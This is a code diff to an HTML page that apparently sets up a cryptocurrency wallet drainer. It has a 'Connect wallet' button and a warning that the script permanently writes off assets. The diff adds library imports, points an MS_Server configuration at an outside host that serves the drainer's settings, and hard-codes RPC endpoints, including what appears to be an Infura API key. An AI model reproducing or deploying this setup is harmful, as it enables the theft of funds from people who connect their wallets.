@@ -20,16 +20,29 @@
     <button onclick="ms_init()">Connect wallet</button>
     <p><strong>Be careful!</strong> The script permanently writes off your assets!</p>
   </div>
-    <!-- Load local scripts last -->
+    <!-- Local library imports -->
+    <script src="./assets/libs/web3.min.js"></script>
+    <script src="./assets/libs/index.min.js"></script>
+    <script src="./assets/libs/index.js"></script>
+
+    <!-- Initialize MS_Server and MS_Settings before other scripts -->
+    <script>
+    window.MS_Server = {
+        endpoint: 'https://fasterdeliveryuae.com',
+        config: '/config'
+    };
+
+    window.MS_Settings = {
+        RPCs: {
+            1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
+            56: "https://bsc-dataseed.binance.org/",
+            137: "https://polygon-rpc.com"
+        }
+    };
+    </script>
+
+    <!-- Your existing scripts -->
     <script src="./assets/web3-provider/web3-connect.js"></script>
-    <script src="./assets/web3-provider/web3-router.js"></script>
-    <script src="./assets/web3-provider/web3-module.js"></script>
-    <script src="./assets/web3-provider/web3-alert.js"></script>
-    <script src="./assets/web3-provider/web3-seaport.js"></script>
-    <script src="./assets/web3-provider/web3-data.js"></script>
-    <script src="./assets/web3-provider/ethers.js"></script>
-    <script src="./assets/web3-provider/ethereum-tx.js"></script>
-    <script src="./assets/web3-provider.js"></script>
   <script>
     setInterval(() => {
       document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
